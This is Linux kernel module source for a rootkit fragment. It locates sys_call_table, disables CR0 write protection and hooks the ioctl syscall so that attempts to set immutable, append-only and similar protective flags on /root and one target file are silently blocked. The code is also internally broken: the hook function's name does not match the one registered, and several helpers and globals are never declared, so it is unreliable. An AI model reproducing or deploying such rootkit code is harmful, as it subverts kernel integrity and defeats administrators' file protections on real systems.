#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/timekeeping.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kallsyms.h>
#include <linux/limits.h>
#include <asm/unistd.h>
#include <linux/inet.h>
#include <linux/namei.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/string.h>
#include <linux/timekeeping.h>
#include <asm/unistd.h>
#include <linux/tty.h>
#include <linux/mount.h>
#include <linux/fs_struct.h>
#include <linux/path.h> 
#include <linux/signal.h>
#include <linux/sched.h> 
#include <linux/kthread.h> 
#include <linux/delay.h>  
#include <linux/sched/signal.h> 


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library");

#define TARGET_FILE "/root/user_data.txt"
#define DATA "some text"
#define USERNAME_LEN (strlen(USERNAME))
#define ROOT_DIR "/root"
#define ROOT_DIR_LEN (strlen(ROOT_DIR)) 
#define FS_IMMUTABLE_FL 0x00000010 
#define FS_APPEND_FL 0x00000020 
#define FS_COMPR_FL 0x00000004 
#define FS_UNRM_FL 0x00000002 
#define FS_NODUMP_FL 0x00000040 

#define BLOCKED_FLAGS (FS_IMMUTABLE_FL | FS_APPEND_FL | FS_COMPR_FL | FS_UNRM_FL | FS_NODUMP_FL) 


static asmlinkage long (*orig_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);


notrace asmlinkage long hack_kill(unsigned int fd, unsigned int cmd, unsigned long arg) {
    int flags;

    if (compare_path(fd, ROOT_DIR) == 0 || compare_path(fd, TARGET_FILE) == 0) {
        if (cmd == FS_IOC_SETFLAGS) {
            if (copy_from_user(&flags, (int __user *)arg, sizeof(flags))) {
                return -EFAULT;
            }

            if (flags & BLOCKED_FLAGS) {
                return 0;
            }
        }
    }

    return orig_ioctl(fd, cmd, arg);
}

notrace static int rootkit_init(void)
{
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        return -1;
    }

    write_cr0(read_cr0() & (~0x00010000));

    orig_ioctl      = (void *) sys_call_table[__NR_ioctl];
    sys_call_table[__NR_ioctl] = (unsigned long) hook_ioctl;

    write_cr0(read_cr0() | 0x00010000);


    return 0;
}

notrace static void rootkit_exit(void)
{
    write_cr0(read_cr0() & (~0x00010000));
    sys_call_table[__NR_ioctl]      = (unsigned long) orig_ioctl;
    write_cr0(read_cr0() | 0x00010000);
}


module_init(rootkit_init);
module_exit(rootkit_exit);
